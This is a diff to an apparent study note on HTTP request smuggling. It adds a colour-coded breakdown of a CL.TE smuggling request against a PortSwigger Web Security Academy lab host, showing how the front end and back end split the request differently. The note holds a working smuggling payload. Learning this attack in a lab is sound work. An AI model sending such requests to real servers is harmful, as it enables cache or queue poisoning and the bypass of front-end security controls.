@@ -380,22 +380,46 @@ Observed any response status or response length difference.
 _Burp suite extensions : Param miner | HTTP Request Smuggler_
 
 #### Summary
+🔵 1st request
+⚪ 2nd request
+🔴 3rd request
+➡️⬅️ Content-Length interpreted by the server
+
 ##### CL.TE
-In that scenario
-![#f03c15](https://placehold.co/15x15/f03c15/f03c15.png) `#f03c15`
+In that scenario :
+- The front end relies on Content-Length
+- The back-end relies on Transfer-Encoding
+
 ```
-POST / HTTP/1.1
-Host: 0ae60020040cd411805762cb00b400b4.web-security-academy.net
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 43
-Transfer-encoding: chunked
+*** FRONT END INTERPRETATION ***
+🔵 POST / HTTP/1.1
+🔵 Host: 0ae60020040cd411805762cb00b400b4.web-security-academy.net
+🔵 Content-Type: application/x-www-form-urlencoded
+🔵 Content-Length: 43⬅️
+🔵 Transfer-encoding: chunked
+🔵
+🔵 ➡️3
+🔵 a=1
+🔵 0
+🔵 
+🔵 GET /404 HTTP/1.1
+🔵 X-Ignore: X⬅️
+```
 
-3
-a=1
-0
+```
+*** BACK END INTERPRETATION ***
+🔵 POST / HTTP/1.1
+🔵 Host: 0ae60020040cd411805762cb00b400b4.web-security-academy.net
+🔵 Content-Type: application/x-www-form-urlencoded
+🔵 Content-Length: 43
+🔵 ➡️Transfer-encoding: chunked⬅️
+🔵 
+🔵 ➡️3
+🔵 a=1
+🔵 0⬅️
 
-GET /404 HTTP/1.1
-X-Ignore: X
+⚪ GET /404 HTTP/1.1
+⚪ X-Ignore: X
 ```
 
 
